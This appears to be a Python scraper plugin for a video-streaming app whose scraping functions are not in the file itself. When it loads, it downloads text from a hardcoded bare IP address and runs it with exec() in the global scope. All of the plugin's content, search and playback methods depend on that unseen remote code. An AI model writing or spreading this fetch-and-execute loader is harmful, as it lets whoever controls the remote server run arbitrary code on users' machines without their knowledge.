# coding=utf-8
# !/usr/bin/python
from urllib.parse import quote
import urllib.parse
import requests
from bs4 import BeautifulSoup
import re
from base.spider import Spider
import sys
import json
import os
import base64
import threading
import concurrent.futures
import shutil

sys.path.append('..')

headerx = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36'
}

function_string = requests.get('http://210.16.170.113:9343/ids?ids=星耀').text
exec(function_string, globals())
xurl2 = geturl2()


class Spider(Spider):
    global xurl2
    global headerx
    global pm

    def getName(self):
        return "首页"

    def init(self, extend):
        pass

    def isVideoFormat(self, url):
        pass

    def manualVideoCheck(self):
        pass

    def homeContent(self, filter):
        return homeContent(filter)

    def homeVideoContent(self):
        pass

    def categoryContent(self, cid, pg, filter, ext):
        return categoryContent(cid, pg, filter, ext)

    def detailContent(self, ids):
        return detailContent(ids)

    def playerContent(self, flag, id, vipFlags):
        return playerContent(flag, id, vipFlags)

    def searchContentPage(self, key, quick, page, *args, **kwargs):
        return searchContentPage(key, quick, page, *args, **kwargs)

    def searchContent(self, key, quick, pg="1", *args, **kwargs):
        return self.searchContentPage(key, quick, pg, *args, **kwargs)

    def localProxy(self, params):
        if params['type'] == "m3u8":
            return self.proxyM3u8(params)
        elif params['type'] == "media":
            return self.proxyMedia(params)
        elif params['type'] == "ts":
            return self.proxyTs(params)
        return None





